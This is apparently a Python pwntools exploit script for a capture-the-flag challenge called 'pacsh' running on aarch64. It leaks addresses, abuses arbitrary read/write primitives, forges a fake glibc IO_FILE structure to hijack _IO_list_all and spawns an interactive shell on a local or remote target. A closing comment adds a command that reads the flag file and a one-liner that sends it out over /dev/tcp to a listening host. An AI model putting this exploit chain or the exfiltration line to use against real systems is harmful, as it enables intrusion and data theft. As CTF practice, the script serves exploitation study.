
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process([ "qemu-aarch64","pacsh"])
    if args.GDB:
        r = process([ "qemu-aarch64","-g","1234","pacsh"])
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ru("help: ")
help_addr = int(r.recvline().strip(),16)
leak("help_addr",hex(help_addr))
ru("ls: ")
ls_addr = int(r.recvline().strip(),16)
leak("ls_addr",hex(ls_addr))
ru("read64: ")
read64_addr = int(r.recvline().strip(),16)
leak("read64_addr",hex(read64_addr))
ru("write64: ")
write64_addr = int(r.recvline().strip(),16)
leak("write64_addr",hex(write64_addr))
#leak("libc",hex(libc))
def help_func():
    sla("sh> ",hex(help_addr))
    return
def read64(addr):
    sla("sh> ",hex(read64_addr))
    sla("64> ",hex(addr))
    return int(r.recvline(),16)
def write64(addr,value):
    sla("sh> ",hex(write64_addr))
    sla("64> ",hex(addr)+" "+hex(value)[2:])
    return
system_addr = 0x55018b6d94
# print(hex(read64(0x5500012028)))
write64(0x5500012028,system_addr)
# print(hex(read64(0x5500012028)))
help_func()
ru("ls: ")
system_pac_addr = int(r.recvline().strip(),16)
leak("system_pac_addr",hex(system_pac_addr))
libc = 0x5501870000
gadget1_addr = 0x3cef0 + libc # 0x5501927ac0

# gadget1_addr = 0x5501927a50
write64(0x5500012028,gadget1_addr)
print(hex(read64(0x5500012028)))
help_func()
ru("ls: ")
gadget1_pac_addr = int(r.recvline().strip(),16)
leak("gadget1_pac_addr",hex(gadget1_pac_addr))
IO_list_all = 0x5501a0d4f0
fake_io_addr = 0x5500012140  # 伪造的 fake_IO 结构体的地址
# fake_IO_FILE = b"/bin/sh\x00"  # _flags=rdi
fake_IO_FILE = b'\xd0\x06;sh;\x00\x00'  # _flags=rdi
fake_IO_FILE += p64(0) * 7
fake_IO_FILE += p64(1) + p64(2)  # rcx != 0 (FSOP)
fake_IO_FILE += p64(fake_io_addr + 0xB0)  # _IO_backup_base=rdx
fake_IO_FILE += p64(
    0x55018b6d94
)  # _IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, b"\x00")
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b"\x00")
fake_IO_FILE += p64(0x5500012140+0x150)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xA0, b"\x00")
fake_IO_FILE += p64(fake_io_addr + 0x30)  # _wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xC0, b"\x00")
fake_IO_FILE += p64(1)  # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xD8, b"\x00")
fake_IO_FILE += p64(
    libc + 0x1994a8 + 0x30
)  # vtable=IO_wfile_jumps+0x10 （FSOP 需将 vtable 改为 IO_wfile_jumps + 0x30）
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr + 0x40)  # rax2_addr
for i in range(0,len(fake_IO_FILE),8):
    write64(fake_io_addr+i,u64(fake_IO_FILE[i:i+8]))

write64(IO_list_all,fake_io_addr)

sla("sh> ",hex(gadget1_pac_addr))
# write64(0x5501820388, gadget1_pac_addr)
# write64(0x5501820388, system_pac_addr)


r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''